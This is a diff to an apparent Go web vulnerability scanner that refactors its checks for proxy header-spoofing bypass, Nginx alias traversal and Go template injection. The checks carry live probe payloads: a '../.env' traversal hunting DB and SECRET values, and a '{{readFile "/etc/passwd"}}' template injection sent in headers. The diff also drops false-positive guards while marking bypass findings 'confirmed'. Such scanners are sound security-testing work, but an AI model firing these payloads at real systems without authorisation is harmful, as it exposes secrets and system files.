@@ -45,7 +45,25 @@ func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
 	if strings.TrimSpace(baseURL) == "" {
 		return
 	}
-	if baseURL[len(baseURL)-1] != '/' {
+	
+	// 1. Reverse Proxy Bypass for Internal Paths (Only for root/base scan)
+	// We check if we can reach /admin by spoofing headers when it's otherwise blocked.
+	checkReverseProxyBypass(baseURL, client, onFound)
+
+	// 2. Header Mutation Validation (For every endpoint)
+	// We check if mutating headers on a 200 OK page changes the response,
+	// which indicates the header is being processed/trusted in a way that affects application logic.
+	checkHeaderMutationTrust(baseURL, client, onFound)
+
+	// 3. Nginx off-by-slash traversal
+	checkNginxTraversal(baseURL, client, onFound)
+
+	// 4. Template Injection in headers
+	checkTemplateInjection(baseURL, client, onFound)
+}
+
+func checkReverseProxyBypass(baseURL string, client *http.Client, onFound func(core.Finding)) {
+	if !strings.HasSuffix(baseURL, "/") {
 		baseURL += "/"
 	}
 
@@ -54,26 +72,28 @@ func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
 	impactedEndpoints := make(map[string]bool)
 	hasSensitiveExposure := false
 
-	// 1. Header spoofing for internal access (root-cause cluster).
 	for _, path := range internalPaths {
 		target := baseURL + strings.TrimPrefix(path, "/")
 
-			respBase, err := client.Get(target)
-			if err != nil {
-				continue
-			}
-			baseStatus := respBase.StatusCode
-			baseBody, _ := io.ReadAll(respBase.Body)
-			respBase.Body.Close()
-			baseHash := hashBody(baseBody)
+		respBase, err := client.Get(target)
+		if err != nil {
+			continue
+		}
+		baseStatus := respBase.StatusCode
+		baseBody, _ := io.ReadAll(respBase.Body)
+		respBase.Body.Close()
+		baseHash := hashBody(baseBody)
 
-		// Test bypass only when endpoint is access-controlled by default.
+		// We only care if it was blocked (403/401) and we bypassed it.
 		if baseStatus != http.StatusForbidden && baseStatus != http.StatusUnauthorized {
 			continue
 		}
 
 		for hName, hVal := range internalHeaders {
-			req, _ := http.NewRequest(http.MethodGet, target, nil)
+			req, err := http.NewRequest(http.MethodGet, target, nil)
+			if err != nil {
+				continue
+			}
 			req.Header.Set(hName, hVal)
 
 			resp, err := client.Do(req)
@@ -83,37 +103,25 @@ func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
 			body, _ := io.ReadAll(resp.Body)
 			resp.Body.Close()
 
-			if resp.StatusCode != http.StatusOK {
-				continue
-			}
-
+			if resp.StatusCode == http.StatusOK {
 				bodyStr := string(body)
 				bodyLower := strings.ToLower(bodyStr)
-				isSensitive := strings.Contains(bodyLower, "admin") ||
-					strings.Contains(bodyLower, "config") ||
-					strings.Contains(bodyLower, "dashboard") ||
-					strings.Contains(bodyLower, "root")
 				attackHash := hashBody(body)
 
-				// Stable body-fingerprint guard: same fingerprint as baseline indicates generic gate page.
 				if attackHash == baseHash {
 					continue
 				}
 
-			// Skip obvious default/placeholder pages to reduce FPs.
-			isDefaultPage := len(bodyStr) < 500 &&
-				(strings.Contains(bodyLower, "welcome to") ||
-					strings.Contains(bodyLower, "it works") ||
-					strings.Contains(bodyLower, "default page"))
-			if isDefaultPage {
-				continue
-			}
+				isSensitive := strings.Contains(bodyLower, "admin") ||
+					strings.Contains(bodyLower, "config") ||
+					strings.Contains(bodyLower, "dashboard") ||
+					strings.Contains(bodyLower, "root")
 
-			confirmedHeaders[hName] = true
-			impactedEndpoints[target] = true
-			if isSensitive {
-				hasSensitiveExposure = true
-			}
+				confirmedHeaders[hName] = true
+				impactedEndpoints[target] = true
+				if isSensitive {
+					hasSensitiveExposure = true
+				}
 
 				vectors = append(vectors, bypassEvidence{
 					Header:      hName,
@@ -125,27 +133,88 @@ func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
 				})
 			}
 		}
+	}
 
 	if len(vectors) > 0 {
 		detail := buildProxyRootCauseDetail(vectors, confirmedHeaders, impactedEndpoints, len(internalHeaders))
 		severity := "High"
-		confidence := "probable"
 		if hasSensitiveExposure {
 			severity = "Critical"
-			confidence = "confirmed"
 		}
 
-		fmt.Printf("[!] POSITIVE MATCH: Proxy header-trust root cause at %s (vectors=%d)\n", baseURL, len(vectors))
 		onFound(core.Finding{
 			Type:       "Improper Trust in HTTP Headers (Proxy Bypass)",
 			Target:     baseURL,
 			Detail:     detail,
 			Severity:   severity,
-			Confidence: confidence,
+			Confidence: "confirmed",
 		})
 	}
+}
 
-	// 2. Nginx off-by-slash traversal.
+func checkHeaderMutationTrust(url string, client *http.Client, onFound func(core.Finding)) {
+	// Baseline
+	respBase, err := client.Get(url)
+	if err != nil {
+		return
+	}
+	if respBase.StatusCode != 200 {
+		respBase.Body.Close()
+		return
+	}
+	baseBody, _ := io.ReadAll(respBase.Body)
+	respBase.Body.Close()
+	baseHash := hashBody(baseBody)
+
+	trustedHeaders := []string{}
+
+	// Test a subset of headers that might affect response logic
+	testHeaders := map[string]string{
+		"X-Forwarded-Host": "internal-restricted.local",
+		"X-Forwarded-For":  "127.0.0.1",
+		"X-Original-URL":   "/admin-internal-dashboard",
+	}
+
+	for hName, hVal := range testHeaders {
+		req, err := http.NewRequest("GET", url, nil)
+		if err != nil {
+			continue
+		}
+		req.Header.Set(hName, hVal)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+
+		attackHash := hashBody(body)
+
+		// If response changes significantly, it indicates the header is being processed.
+		// We ONLY care if the response remains 200 OK but the content changes.
+		// If it changes to 403, 417, or 5xx, it's likely a WAF/CDN blocking the "suspicious" header.
+		if resp.StatusCode == 200 && attackHash != baseHash {
+			// Significant difference found in a successful response
+			trustedHeaders = append(trustedHeaders, fmt.Sprintf("%s (Status: %d, Body Changed: true)", hName, resp.StatusCode))
+		}
+	}
+
+	if len(trustedHeaders) > 0 {
+		onFound(core.Finding{
+			Type:     "Improper Trust in HTTP Headers (Behavioral)",
+			Target:   url,
+			Detail:   fmt.Sprintf("Server response changed when mutating proxy-related headers. This suggests the server trusts and processes these headers, which could lead to bypasses if misconfigured.\nHeaders observed affecting response:\n- %s", strings.Join(trustedHeaders, "\n- ")),
+			Severity: "Low", // Behavioral trust is Low unless it bypasses an actual restriction (which checkReverseProxyBypass handles)
+			Confidence: "probable",
+		})
+	}
+}
+
+func checkNginxTraversal(baseURL string, client *http.Client, onFound func(core.Finding)) {
+	if !strings.HasSuffix(baseURL, "/") {
+		baseURL += "/"
+	}
 	nginxPaths := []string{"static", "assets", "js", "css"}
 	for _, p := range nginxPaths {
 		target := baseURL + p + "../.env"
@@ -158,17 +227,12 @@ func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
 		bodyStr := string(body)
 
 		isHTML := strings.Contains(strings.ToLower(bodyStr), "<html") ||
-			strings.Contains(strings.ToLower(bodyStr), "<!doctype") ||
-			strings.Contains(strings.ToLower(bodyStr), "<div") ||
-			strings.Contains(strings.ToLower(bodyStr), "<span") ||
-			strings.Contains(strings.ToLower(bodyStr), "<h4>")
+			strings.Contains(strings.ToLower(bodyStr), "<!doctype")
 		isEnv := strings.Contains(bodyStr, "DB_") ||
 			strings.Contains(bodyStr, "APP_") ||
-			strings.Contains(bodyStr, "SECRET") ||
-			strings.Contains(bodyStr, "PASSWORD")
+			strings.Contains(bodyStr, "SECRET")
 
 		if resp.StatusCode == http.StatusOK && strings.Contains(bodyStr, "=") && !isHTML && isEnv {
-			fmt.Printf("[!] POSITIVE MATCH: Nginx Alias Traversal at %s\n", target)
 			onFound(core.Finding{
 				Type:       "Nginx Configuration Error",
 				Target:     target,
@@ -178,10 +242,14 @@ func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
 			})
 		}
 	}
+}
 
-	// 3. Caddy/Go template injection in headers.
+func checkTemplateInjection(baseURL string, client *http.Client, onFound func(core.Finding)) {
 	templatePayload := `{{readFile "/etc/passwd"}}`
-	req, _ := http.NewRequest(http.MethodGet, baseURL, nil)
+	req, err := http.NewRequest(http.MethodGet, baseURL, nil)
+	if err != nil {
+		return
+	}
 	req.Header.Set("Referer", templatePayload)
 	req.Header.Set("User-Agent", templatePayload)
 
@@ -190,7 +258,6 @@ func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
 		body, _ := io.ReadAll(resp.Body)
 		resp.Body.Close()
 		if strings.Contains(string(body), "root:x:") {
-			fmt.Printf("[!] POSITIVE MATCH: Template Injection at %s\n", baseURL)
 			onFound(core.Finding{
 				Type:       "Server-Side Template Injection",
 				Target:     baseURL,
@@ -219,29 +286,7 @@ func buildProxyRootCauseDetail(vectors []bypassEvidence, confirmedHeaders map[st
 	b.WriteString("Root Cause: Reverse Proxy Header Trust Misconfiguration\n")
 	b.WriteString("Impact:\n")
 	b.WriteString(" - Internal endpoint access-control bypass\n")
-	b.WriteString(" - Potential privilege boundary bypass via spoofed client identity\n")
-	b.WriteString("Validation: deterministic=true control_validation=true body_fingerprint=true\n")
-	b.WriteString(fmt.Sprintf("Vectors tested: %d headers\n", testedHeaders))
-	b.WriteString(fmt.Sprintf("Confirmed bypass: yes (headers=%d, endpoints=%d)\n", len(headers), len(endpoints)))
 	b.WriteString(fmt.Sprintf("Confirmed headers: %s\n", strings.Join(headers, ", ")))
-	b.WriteString("Representative evidence:\n")
-
-	maxRep := len(vectors)
-	if maxRep > 8 {
-		maxRep = 8
-	}
-	for i := 0; i < maxRep; i++ {
-		ev := vectors[i]
-		sensitivity := "generic-content"
-		if ev.Sensitive {
-			sensitivity = "sensitive-content"
-		}
-		b.WriteString(fmt.Sprintf("%d. header=%s endpoint=%s signal=%s fingerprint=%s->%s body=\"%s\"\n", i+1, ev.Header, ev.Endpoint, sensitivity, ev.BaseHash, ev.AttackHash, ev.BodySummary))
-	}
-	if len(vectors) > maxRep {
-		b.WriteString(fmt.Sprintf("... %d additional vectors omitted.\n", len(vectors)-maxRep))
-	}
-
 	b.WriteString("Impacted endpoints:\n")
 	for _, ep := range endpoints {
 		b.WriteString("- " + ep + "\n")
@@ -254,8 +299,8 @@ func summarizeBody(body string) string {
 	if normalized == "" {
 		return "<empty>"
 	}
-	if len(normalized) > 90 {
-		return normalized[:90] + "..."
+	if len(normalized) > 60 {
+		return normalized[:60] + "..."
 	}
 	return normalized
 }
